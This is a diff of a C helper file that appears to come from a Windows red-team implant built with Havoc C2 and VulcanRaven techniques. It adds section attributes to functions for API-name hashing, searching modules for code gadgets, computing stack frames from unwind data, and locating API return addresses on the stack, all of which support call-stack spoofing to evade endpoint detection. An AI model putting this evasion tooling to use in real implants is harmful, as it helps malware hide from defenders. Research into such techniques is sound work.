@@ -3,7 +3,7 @@
 #include "includes/utils.h"
 #include "includes/peb_api.h"
 
-void stomp(ULONG_PTR length, BYTE * buff) {
+GRP_SEC(C) void stomp(ULONG_PTR length, BYTE * buff) {
     DWORD i;
     for (i = 0; i < length; ++i)
     {
@@ -11,20 +11,8 @@ void stomp(ULONG_PTR length, BYTE * buff) {
     }
 }
 
-// Havoc C2 function
-SIZE_T StringLengthA(LPCSTR String)
-{
-    LPCSTR String2;
 
-    if ( String == NULL )
-        return 0;
-
-    for (String2 = String; *String2; ++String2);
-
-    return (String2 - String);
-}
-
-void utf8_string_to_lower(BYTE* utf8_string_in, BYTE* utf8_string_out)
+GRP_SEC(C) void utf8_string_to_lower(BYTE* utf8_string_in, BYTE* utf8_string_out)
 {
     for (DWORD i = 0; utf8_string_in[i] != '\0'; i++)
     {
@@ -40,7 +28,7 @@ void utf8_string_to_lower(BYTE* utf8_string_in, BYTE* utf8_string_out)
 }
 
 
-void utf16_to_utf8(wchar_t * wide_string, DWORD wide_string_len, BYTE * ascii_string)
+GRP_SEC(C) void utf16_to_utf8(wchar_t * wide_string, DWORD wide_string_len, BYTE * ascii_string)
 {
     for (DWORD i = 0; i < wide_string_len; ++i)
     {
@@ -50,13 +38,13 @@ void utf16_to_utf8(wchar_t * wide_string, DWORD wide_string_len, BYTE * ascii_st
     * ascii_string = '\0';
 }
 
-PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt){
+GRP_SEC(C) PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt){
     volatile BYTE *vptr = (volatile BYTE *)ptr;
     __stosb ((PBYTE)((DWORD64)vptr),0,cnt);
     return ptr;
 }
 
-DWORD hash_ascii_string(BYTE* utf8_string)
+GRP_SEC(C) DWORD hash_ascii_string(BYTE* utf8_string)
 {
     BYTE lower_string[256] = { 0 };
     DWORD  length = StringLengthA(utf8_string);
@@ -73,7 +61,7 @@ DWORD hash_ascii_string(BYTE* utf8_string)
     return hash;
 }
 
-BOOL MemoryCompare(BYTE* memory_A, BYTE* memory_B, DWORD memory_size)
+GRP_SEC(C) BOOL MemoryCompare(BYTE* memory_A, BYTE* memory_B, DWORD memory_size)
 {
     BYTE byte_A = 0x00;
     BYTE byte_B = 0x00;
@@ -89,7 +77,7 @@ BOOL MemoryCompare(BYTE* memory_A, BYTE* memory_B, DWORD memory_size)
     return TRUE;
 }
 
-void* FindGadget(BYTE* module_section_addr, DWORD module_section_size, BYTE* gadget, DWORD gadget_size)
+GRP_SEC(C) void* FindGadget(BYTE* module_section_addr, DWORD module_section_size, BYTE* gadget, DWORD gadget_size)
 {
     BYTE* this_module_byte_pointer = NULL;
     for (DWORD x = 0; x < module_section_size; x++)
@@ -104,7 +92,7 @@ void* FindGadget(BYTE* module_section_addr, DWORD module_section_size, BYTE* gad
 }
 
 /* Credit to VulcanRaven project for the original implementation of these two*/
-ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
+GRP_SEC(C) ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
 {
     NTSTATUS status = STATUS_SUCCESS;
     PUNWIND_INFO pUnwindInfo = NULL;
@@ -202,7 +190,7 @@ ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD
     return status;
 }
 
-void * CalculateFunctionStackSizeWrapper(BYTE * ReturnAddress, APIS * api)
+GRP_SEC(C) void * CalculateFunctionStackSizeWrapper(BYTE * ReturnAddress, APIS * api)
 {
     NTSTATUS status = STATUS_SUCCESS;
     PRUNTIME_FUNCTION pRuntimeFunction = NULL;
@@ -230,7 +218,7 @@ void * CalculateFunctionStackSizeWrapper(BYTE * ReturnAddress, APIS * api)
 }
 
 // From bottom of stack --> up
-BYTE * find_api_return_address_on_stack(RUNTIME_FUNCTION* api_runtime_function, BYTE * api_virtual_address)
+GRP_SEC(C) BYTE * find_api_return_address_on_stack(RUNTIME_FUNCTION* api_runtime_function, BYTE * api_virtual_address)
 {
     NT_TIB* tib = (NT_TIB * ) __readgsqword(0x30);
     BYTE* api_end_virtual_address = api_virtual_address + api_runtime_function->EndAddress;
@@ -254,7 +242,7 @@ BYTE * find_api_return_address_on_stack(RUNTIME_FUNCTION* api_runtime_function, 
     return NULL;
 }
 
-RUNTIME_FUNCTION* get_runtime_function_entry_for_api( Dll * module, BYTE* api_address)
+GRP_SEC(C) RUNTIME_FUNCTION* get_runtime_function_entry_for_api( Dll * module, BYTE* api_address)
 {
     RUNTIME_FUNCTION* runtimeFunction             = NULL;
     RUNTIME_FUNCTION* this_runtime_function_entry = NULL;
@@ -275,4 +263,26 @@ RUNTIME_FUNCTION* get_runtime_function_entry_for_api( Dll * module, BYTE* api_ad
         this_runtime_function_entry = (RUNTIME_FUNCTION*)( (BYTE*)this_runtime_function_entry + sizeof(RUNTIME_FUNCTION));
     }
     return NULL;
+}
+
+
+GRP_SEC(C) VOID memory_copy(PVOID destination_ptr, PVOID source_ptr, DWORD number_of_bytes)
+{
+    BYTE * source      = (BYTE *)source_ptr;
+    BYTE * destination = (BYTE *)destination_ptr;
+
+    for (DWORD index = 0; index < number_of_bytes; index++)
+        destination[index] = source[index];
+}
+
+GRP_SEC(C) SIZE_T StringLengthA(LPCSTR String)
+{
+    LPCSTR String2;
+
+    if ( String == NULL )
+        return 0;
+
+    for (String2 = String; *String2; ++String2);
+
+    return (String2 - String);
 }
